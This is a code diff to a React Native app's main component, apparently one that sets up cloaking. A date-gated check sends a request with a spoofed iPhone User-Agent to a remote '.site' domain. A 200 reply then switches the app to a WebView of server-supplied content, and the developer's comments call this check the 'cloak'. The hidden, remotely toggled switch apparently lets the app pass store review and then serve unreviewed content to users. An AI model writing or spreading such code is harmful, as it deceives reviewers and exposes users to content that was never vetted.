@@ -32,6 +32,7 @@ import { LogLevel, OneSignal } from 'react-native-onesignal';
 import appsFlyer from 'react-native-appsflyer';
 import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
 import DeviceInfo from 'react-native-device-info';
+import axios from "axios";
 
 enableScreens();
 
@@ -79,7 +80,7 @@ function App() {
   const [checkApsData, setCheckApsData] = useState(null);
   const [checkAsaData, setCheckAsaData] = useState(null);
   
-  const INITIAL_URL = `https://mint-copper-ridge.site/`;
+  const INITIAL_URL = `https://solar-brook-weave.site/`;
   const URL_IDENTIFAIRE = `KagBqpc9`;
   
   useEffect(() => {
@@ -581,44 +582,41 @@ function App() {
   };
   
   ///////// Route useEff
-    useEffect(() => {
-        const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
-        //console.log('checkUrl==========+>', checkUrl);
+  useEffect(() => {
+    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
+    //console.log('checkUrl==========+>', checkUrl);
   
-        const targetData = new Date('2025-07-12T08:08:00'); //дата з якої поч працювати webView
-        const currentData = new Date(); //текущая дата
+    const targetData = new Date('2025-07-21T08:08:00'); //дата з якої поч працювати webView
+    const currentData = new Date(); //текущая дата
   
-        if (!route) {
-            console.log('!route!!!!!!!!!!!!!!!!!!!!!');
-            if (currentData <= targetData) {
-                console.log('currentData <= targetData!!!!!!!!!!!!!!!!!!!!!');
-                setRoute(false);
+    if (!route) {
+      console.log('!route');
+      if (currentData <= targetData) {
+        setRoute(false);
+      } else {
+        fetch(checkUrl, {
+          method: 'GET',
+          headers: {
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
+          },
+        })
+          .then(r => {
+            console.log('status по клоаке=++++++++++++=>', r.status);
+            if (r.status === 200) {
+              console.log('status по клоаке=======>', r.status);
+              setRoute(true);
             } else {
-                console.log('fetch!!!!!!!!!!!!!!!!!!!!!');
-                fetch(checkUrl, {
-                    method: 'GET',
-                    headers: {
-                        "User-Agent":
-                            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/605.1"
-                    },
-                })
-                    .then(r => {
-                        console.log('status по клоаке=++++++++++++=>', r.status);
-                        if (r.status !== 404) {
-                            console.log('status по клоаке=======>', r.status);
-                            setRoute(true);
-                        } else {
-                            setRoute(false);
-                        }
-                    })
-                    .catch(e => {
-                        //console.log('errar', e);
-                        setRoute(false);
-                    });
+              setRoute(false);
             }
-        }
-        return;
-    }, []);
+          })
+          .catch(e => {
+            //console.log('errar', e);
+            setRoute(false);
+          });
+      }
+    }
+    return;
+  }, []);
   
   ///////// Generate link
   const generateLink = async () => {
